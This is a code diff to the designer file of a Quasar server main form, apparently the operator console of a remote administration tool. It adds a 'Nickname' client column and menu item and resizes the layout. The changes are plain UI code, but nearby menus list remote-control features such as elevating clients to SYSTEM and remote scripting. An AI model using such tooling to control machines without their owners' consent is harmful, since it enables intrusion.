@@ -95,6 +95,7 @@ namespace Quasar.Server.Forms
             this.elevateClientPermissionsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.elevateToSystemToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.deElevateToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.nicknameToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.updateToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.reconnectToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.disconnectToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
@@ -110,6 +111,7 @@ namespace Quasar.Server.Forms
             this.panel1 = new System.Windows.Forms.Panel();
             this.lstClients = new Quasar.Server.Controls.AeroListView();
             this.hIP = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
+            this.hNick = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.hTag = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.hUserPC = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
             this.hVersion = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
@@ -560,6 +562,7 @@ namespace Quasar.Server.Forms
             this.elevateClientPermissionsToolStripMenuItem,
             this.elevateToSystemToolStripMenuItem,
             this.deElevateToolStripMenuItem,
+            this.nicknameToolStripMenuItem,
             this.updateToolStripMenuItem,
             this.reconnectToolStripMenuItem,
             this.disconnectToolStripMenuItem,
@@ -592,6 +595,14 @@ namespace Quasar.Server.Forms
             this.deElevateToolStripMenuItem.Size = new System.Drawing.Size(211, 22);
             this.deElevateToolStripMenuItem.Text = "DeElevate From System";
             this.deElevateToolStripMenuItem.Click += new System.EventHandler(this.deElevateToolStripMenuItem_Click);
+            // 
+            // nicknameToolStripMenuItem
+            // 
+            this.nicknameToolStripMenuItem.Image = global::Quasar.Server.Properties.Resources.uac_shield;
+            this.nicknameToolStripMenuItem.Name = "nicknameToolStripMenuItem";
+            this.nicknameToolStripMenuItem.Size = new System.Drawing.Size(211, 22);
+            this.nicknameToolStripMenuItem.Text = "Nickname";
+            this.nicknameToolStripMenuItem.Click += new System.EventHandler(this.nicknameToolStripMenuItem_Click);
             // 
             // updateToolStripMenuItem
             // 
@@ -912,7 +923,7 @@ namespace Quasar.Server.Forms
             this.tableLayoutPanel.RowStyles.Add(new System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Absolute, 25F));
             this.tableLayoutPanel.RowStyles.Add(new System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Percent, 100F));
             this.tableLayoutPanel.RowStyles.Add(new System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Absolute, 22F));
-            this.tableLayoutPanel.Size = new System.Drawing.Size(1230, 594);
+            this.tableLayoutPanel.Size = new System.Drawing.Size(1604, 594);
             this.tableLayoutPanel.TabIndex = 6;
             // 
             // MainTabControl
@@ -926,7 +937,7 @@ namespace Quasar.Server.Forms
             this.MainTabControl.Margin = new System.Windows.Forms.Padding(0);
             this.MainTabControl.Name = "MainTabControl";
             this.MainTabControl.SelectedIndex = 0;
-            this.MainTabControl.Size = new System.Drawing.Size(1230, 547);
+            this.MainTabControl.Size = new System.Drawing.Size(1604, 547);
             this.MainTabControl.TabIndex = 7;
             this.MainTabControl.SelectedIndexChanged += new System.EventHandler(this.MainTabControl_SelectedIndexChanged);
             // 
@@ -938,7 +949,7 @@ namespace Quasar.Server.Forms
             this.tabPage1.Location = new System.Drawing.Point(4, 22);
             this.tabPage1.Margin = new System.Windows.Forms.Padding(0);
             this.tabPage1.Name = "tabPage1";
-            this.tabPage1.Size = new System.Drawing.Size(1222, 521);
+            this.tabPage1.Size = new System.Drawing.Size(1596, 521);
             this.tabPage1.TabIndex = 0;
             this.tabPage1.Text = "ClientTabPage";
             this.tabPage1.UseVisualStyleBackColor = true;
@@ -948,7 +959,7 @@ namespace Quasar.Server.Forms
             this.splitter1.Dock = System.Windows.Forms.DockStyle.Bottom;
             this.splitter1.Location = new System.Drawing.Point(0, 375);
             this.splitter1.Name = "splitter1";
-            this.splitter1.Size = new System.Drawing.Size(1222, 3);
+            this.splitter1.Size = new System.Drawing.Size(1596, 3);
             this.splitter1.TabIndex = 34;
             this.splitter1.TabStop = false;
             this.splitter1.Visible = false;
@@ -961,13 +972,14 @@ namespace Quasar.Server.Forms
             this.panel1.Location = new System.Drawing.Point(0, 0);
             this.panel1.Margin = new System.Windows.Forms.Padding(0);
             this.panel1.Name = "panel1";
-            this.panel1.Size = new System.Drawing.Size(1222, 378);
+            this.panel1.Size = new System.Drawing.Size(1596, 378);
             this.panel1.TabIndex = 33;
             // 
             // lstClients
             // 
             this.lstClients.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
             this.hIP,
+            this.hNick,
             this.hTag,
             this.hUserPC,
             this.hVersion,
@@ -989,7 +1001,7 @@ namespace Quasar.Server.Forms
             this.lstClients.LvwColumnSorter = listViewColumnSorter1;
             this.lstClients.Name = "lstClients";
             this.lstClients.ShowItemToolTips = true;
-            this.lstClients.Size = new System.Drawing.Size(945, 378);
+            this.lstClients.Size = new System.Drawing.Size(1319, 378);
             this.lstClients.SmallImageList = this.imgFlags;
             this.lstClients.TabIndex = 1;
             this.lstClients.UseCompatibleStateImageBehavior = false;
@@ -1004,6 +1016,11 @@ namespace Quasar.Server.Forms
             // 
             this.hIP.Text = "IP Address";
             this.hIP.Width = 112;
+            // 
+            // hNick
+            // 
+            this.hNick.Text = "Nickname";
+            this.hNick.Width = 112;
             // 
             // hTag
             // 
@@ -1047,7 +1064,7 @@ namespace Quasar.Server.Forms
             // hAccountType
             // 
             this.hAccountType.Text = "Account Type";
-            this.hAccountType.Width = 116;
+            this.hAccountType.Width = 101;
             // 
             // tableLayoutPanel1
             // 
@@ -1058,7 +1075,7 @@ namespace Quasar.Server.Forms
             this.tableLayoutPanel1.Controls.Add(this.gBoxClientInfo, 0, 3);
             this.tableLayoutPanel1.Controls.Add(this.tableLayoutPanel2, 0, 2);
             this.tableLayoutPanel1.Dock = System.Windows.Forms.DockStyle.Right;
-            this.tableLayoutPanel1.Location = new System.Drawing.Point(945, 0);
+            this.tableLayoutPanel1.Location = new System.Drawing.Point(1319, 0);
             this.tableLayoutPanel1.Margin = new System.Windows.Forms.Padding(0);
             this.tableLayoutPanel1.Name = "tableLayoutPanel1";
             this.tableLayoutPanel1.RowCount = 4;
@@ -1237,7 +1254,7 @@ namespace Quasar.Server.Forms
             this.DebugLogRichBox.Location = new System.Drawing.Point(0, 378);
             this.DebugLogRichBox.Name = "DebugLogRichBox";
             this.DebugLogRichBox.ReadOnly = true;
-            this.DebugLogRichBox.Size = new System.Drawing.Size(1222, 143);
+            this.DebugLogRichBox.Size = new System.Drawing.Size(1596, 143);
             this.DebugLogRichBox.TabIndex = 35;
             this.DebugLogRichBox.Text = "";
             this.DebugLogRichBox.Visible = false;
@@ -1698,7 +1715,7 @@ namespace Quasar.Server.Forms
             this.connectedToolStripStatusLabel});
             this.statusStrip.Location = new System.Drawing.Point(0, 572);
             this.statusStrip.Name = "statusStrip";
-            this.statusStrip.Size = new System.Drawing.Size(1230, 22);
+            this.statusStrip.Size = new System.Drawing.Size(1604, 22);
             this.statusStrip.SizingGrip = false;
             this.statusStrip.TabIndex = 3;
             this.statusStrip.Text = "statusStrip1";
@@ -1738,7 +1755,7 @@ namespace Quasar.Server.Forms
             this.builderToolStripMenuItem});
             this.menuStrip.Location = new System.Drawing.Point(0, 0);
             this.menuStrip.Name = "menuStrip";
-            this.menuStrip.Size = new System.Drawing.Size(1230, 25);
+            this.menuStrip.Size = new System.Drawing.Size(1604, 25);
             this.menuStrip.TabIndex = 2;
             // 
             // clientsToolStripMenuItem
@@ -1814,7 +1831,7 @@ namespace Quasar.Server.Forms
             // 
             this.AutoScaleDimensions = new System.Drawing.SizeF(96F, 96F);
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Dpi;
-            this.ClientSize = new System.Drawing.Size(1230, 594);
+            this.ClientSize = new System.Drawing.Size(1604, 594);
             this.Controls.Add(this.tableLayoutPanel);
             this.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.ForeColor = System.Drawing.Color.Black;
@@ -1863,6 +1880,7 @@ namespace Quasar.Server.Forms
         private System.Windows.Forms.ToolStripMenuItem connectionToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem reconnectToolStripMenuItem;
         private System.Windows.Forms.ToolStripMenuItem disconnectToolStripMenuItem;
+        private System.Windows.Forms.ColumnHeader hNick;
         private System.Windows.Forms.ColumnHeader hTag;
         private System.Windows.Forms.ImageList imgFlags;
         private System.Windows.Forms.ToolStripMenuItem systemToolStripMenuItem;
@@ -1992,6 +2010,7 @@ namespace Quasar.Server.Forms
         private ToolStripMenuItem clearLogsToolStripMenuItem;
         private ToolStripMenuItem elevateToSystemToolStripMenuItem;
         private ToolStripMenuItem deElevateToolStripMenuItem;
+        private ToolStripMenuItem nicknameToolStripMenuItem;
         private ToolStripMenuItem remoteScriptingToolStripMenuItem;
         private ToolStripMenuItem audioToolStripMenuItem;
         private ToolStripMenuItem installVirtualMonitorToolStripMenuItem;
